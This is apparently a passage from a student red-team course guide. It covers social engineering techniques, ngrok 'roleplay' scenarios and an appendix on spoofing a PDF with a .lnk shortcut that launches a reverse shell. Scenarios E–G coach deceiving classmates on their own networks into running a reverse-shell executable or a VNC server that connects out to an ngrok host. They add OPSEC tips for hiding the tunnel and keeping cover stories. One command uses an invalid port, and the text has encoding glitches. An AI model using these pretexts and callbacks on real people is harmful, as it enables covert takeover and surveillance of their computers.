## 6. Outside-World Social Engineering Techniques

**This section extends ASF doctrine beyond the classroom. These techniques are documented for educational awareness and defensive understanding.**

### Technique 1: Pretexting (The Fabricated Scenario)

**Definition:** Creating an invented scenario to engage a targeted victim in a way that increases the chance they will divulge information or perform actions.

**Real-World Example:**
An attacker calls a company's IT helpdesk claiming to be a new employee who forgot their password. They use LinkedIn to find the name of a real manager and say "John Smith from Accounting said to call you." The helpdesk resets the password.

**ASF Analysis:**
- Exploits: Authority compliance + helpfulness + time pressure
- Counter (defensive): Verify identity through independent channel. Never reset passwords based on phone calls alone.

**Classroom Application:**
"Hey, the instructor asked me to collect everyone's assignments on a USB for backup. Can you copy yours to this drive?" â€” The authority pretext makes refusal socially difficult.

### Technique 2: Baiting (The Lure)

**Definition:** Leaving physical or digital bait in a location where the victim will find it, counting on their curiosity to trigger the payload.

**Physical Bait:**
- USB drives left in parking lots labeled "Payroll Q4"
- CDs in mailrooms labeled "Confidential â€” Board Review"
- Fake ID badges left near entryways

**Digital Bait:**
- Torrents labeled "Adobe Photoshop Crack"
- Email attachments labeled "Salary_Adjustments_2026.xlsx"
- QR codes in public spaces labeled "Free WiFi"

**ASF Analysis:**
- Exploits: Curiosity + greed + urgency
- The victim *thinks* they are exploiting the situation (finding a free tool) while they are being exploited.
- **The bait preys on the victim's desire to prey.**

### Technique 3: Quid Pro Quo (The Exchange)

**Definition:** Offering a service or benefit in exchange for information or access.

**Real-World Example:**
An attacker calls employees claiming to be from IT support. "We're running a security update. If you let me remote into your machine, I'll fix that slowness you've been experiencing." The victim grants remote access.

**ASF Analysis:**
- Exploits: Helpfulness + problem-solving impulse + trust in IT
- The attacker provides a "solution" to a fabricated or real problem.
- **The victim feels grateful while being compromised.**

### Technique 4: Tailgating (Physical Intimusion)

**Definition:** Following an authorized person into a restricted physical area without credentials.

**Methods:**
- **The polite hold:** "Can you hold the door? My hands are full." (carrying boxes)
- **The smoker's entrance:** Stand near a smoking area. Employees badge out. You follow.
- **The delivery disguise:** Wear a courier uniform. No one questions the UPS guy.

**ASF Analysis:**
- Exploits: Social politeness + assumption of legitimacy + avoiding confrontation
- **People would rather let a stranger in than risk being rude.**

### Technique 5: Spear Phishing (Targeted Deception)

**Definition:** Highly targeted email attacks using personalized information about the victim.

**Indicators of a spear phishing email:**
- Uses your real name and job title (scraped from LinkedIn)
- References real projects or colleagues (scraped from company websites)
- Mimics the writing style of someone you know (analyzed from stolen emails)
- Creates urgency specific to your role ("The auditor needs these files by 5 PM")

**ASF Analysis:**
- Exploits: Context familiarity + time pressure + professional obligation
- **The more personalized the attack, the less critical thinking the victim applies.**

### Technique 6: Watering Hole (Compromised Trust)

**Definition:** Compromising a website that the target group regularly visits, then infecting visitors from that specific organization.

**Example:**
A defense contractor's employees regularly visit a specific industry news site. The attacker compromises that site and serves exploit code only to visitors from the contractor's IP ranges.

**ASF Analysis:**
- Exploits: Habit + trust in familiar websites + no reason to suspect
- **The victim never suspects the website they've visited daily for years.**

### Technique 7: Vishing (Voice Phishing)

**Definition:** Using phone calls to extract information or manipulate victims.

**Advanced Vishing â€” The Conference Call Redirect:**
1. Attacker schedules a fake "IT security briefing" conference call
2. Sends calendar invites that look identical to real company invites
3. On the call, instructs attendees to visit a "security portal" to "update their credentials"
4. The portal is a credential harvester

**ASF Analysis:**
- Exploits: Institutional trust + authority + group psychology (others are doing it)
- **Social proof is weaponized. If others comply, the individual complies.**

## 12. Cross-Network / ngrok Roleplay Scenarios

### The New Paradigm: No Shared Network

In the cross-network scenario, the victim is on a **completely different network** â€” their home WiFi, a mobile hotspot, or classroom WiFi while you're on your own hotspot. The only shared medium is **the internet itself**.

This changes the social engineering dynamic in subtle but critical ways.

### Scenario E: The "Remote Assignment Help" Pretext

**Setup:** You message a classmate outside class hours.

**You:** *"Hey, I'm stuck on this part of the CSEC assignment. The instructor said we should test our tools on each other's machines to simulate a real attack. Can you run this diagnostic script on your laptop? It just checks open ports and reports back to a shared server so we can compare results."*

**Why it works across networks:**
- The "shared server" is actually your ngrok endpoint
- The "diagnostic script" is `spoolsv_ngrok.exe`
- The victim thinks they're participating in a legitimate class exercise
- The callback works because ngrok tunnels their outbound connection to you

**ASF Analysis:**
- **Authority transfer:** "The instructor said..."
- **Collaboration frame:** "So we can compare results"
- **Technical legitimacy:** "Checks open ports" sounds like a real diagnostic
- **Network independence:** The victim never questions why you're not on the same network

### Scenario F: The "Online Lab" Pretext

**Setup:** You create a fake "online lab environment" narrative.

**You:** *"I set up a remote lab for us to practice on. Just run this client â€” it connects to the lab server and gives you a sandboxed Windows instance to test against. The server address is `0.tcp.ngrok.io:12345`. That's the lab gateway."*

**Why it works:**

- The victim assumes `0.tcp.ngrok.io` is a university lab server
- Running the "client" actually gives YOU access to THEIR machine
- The roles are reversed in the victim's mind: they think they're connecting to a lab; the lab is actually connecting to you

**ASF Analysis:**
- **Infrastructure legitimacy:** Cloud hostnames look professional
- **Role reversal:** The victim thinks they are the client connecting to a server
- **Technical plausibility:** Remote labs are common in cybersecurity courses

### Scenario G: The "VNC Viewer Reversal" (ngrok + VNC)

**Setup:** You tell the victim you need to "show them something" on your machine.

**You:** *"I found something interesting in the assignment spec. Can you install this VNC viewer? I'll send you the connection details so you can see my screen. It'll make more sense if I show you."*

**The Trap:**
- You send them `vncserver.exe` (not a viewer)
- You give them your ngrok VNC endpoint
- They run `vncserver.exe -controlapp -connect 0.tcp.ngrok.io:67890`
- Their desktop streams to YOUR VNC viewer
- They think they're connecting to you. You are actually watching them.

**ASF Analysis:**
- **Role reversal:** "I will show you" â†’ "You will show me"
- **Tool misdirection:** "VNC viewer" is actually VNC server
- **Visual confirmation:** The victim sees their own desktop and thinks it's yours
- **Perfect for classroom reveal:** "Wait... that's MY desktop."

### Cross-Network OPSEC

**When operating across networks via ngrok:**

1. **Never mention ngrok by name** to the victim. Call it "the lab server," "the shared host," or "the test gateway."
2. **Use different ngrok accounts** for different operations. Free tier is sufficient and disposable.
3. **Time your tunnel starts** â€” ngrok free tier gives random hostnames. Start the tunnel right before the operation.
4. **Have a cover story** for why the "server" address changes every time. "The lab rotates addresses for security."
5. **Monitor ngrok dashboard** for unexpected connections â€” if someone else hits your endpoint, you know your cover is blown.

# APPENDIX: Phishing with LNK Spoofs


Because you cannot simply rename an `.exe` to `.pdf` and have it run, Red Teams rely on Shortcut (`.lnk`) spoofing. This guide explains how to use the provided `Create_PDF_Spoof.ps1` script to automate the creation of a realistic phishing payload for your presentation.

---

## The Concept
Windows hides known file extensions by default. If you create a shortcut named `Invoice.pdf.lnk`, the user only sees `Invoice.pdf`. 

We configure this shortcut to execute `cmd.exe`. In a fraction of a second, the shortcut will:
1. Silently launch your compiled `rev_shell.exe` in the background.
2. Immediately open a real, harmless dummy PDF file to distract the user.
3. Close the command prompt window.

To the victim, it looks exactly like they just opened a normal PDF. Meanwhile, your reverse shell is connecting back to your Python C2 Command Center.

---

## How to Set It Up for the Lab VM

### Step 1: Prepare the Files on the Target VM
You need three files on the Lab VM to make this work:
1.  **Your Payload:** Move your compiled `rev_shell.exe` to a hidden folder on the VM so the user doesn't see it. 
    *   *Example Path:* `C:\Users\Public\Music\rev_shell.exe`
2.  **The Dummy PDF:** Create or download a harmless PDF (it can just say "Loading..." or contain a fake invoice) and place it in the same hidden folder.
    *   *Example Path:* `C:\Users\Public\Music\Confidential_Salary_Report.pdf`
3.  **The Generator Script:** Move the `Create_PDF_Spoof.ps1` script to the VM.

### Step 2: Generate the Fake PDF
1. On the Lab VM, open PowerShell.
2. Navigate to where you placed `Create_PDF_Spoof.ps1`.
3. Run the script:
   ```powershell
   .\Create_PDF_Spoof.ps1
   ```
*(Note: If PowerShell gives you an execution policy error, run it like this: `powershell -ExecutionPolicy Bypass -File .\Create_PDF_Spoof.ps1`)*

### Step 3: The Result
The script will drop a file onto the VM's Desktop named `Confidential_Salary_Report.pdf.lnk` (which will display as `Confidential_Salary_Report.pdf` with a generic document icon).

### Step 4: The Demonstration
During your presentation, when it is time to gain the initial foothold:
1. Ensure your Python C2 script is listening on your Host machine.
2. On the VM, double-click the fake "Confidential_Salary_Report.pdf" icon on the Desktop.
3. The dummy PDF will open on the screen, but your Python script will successfully catch the hidden reverse shell connection!
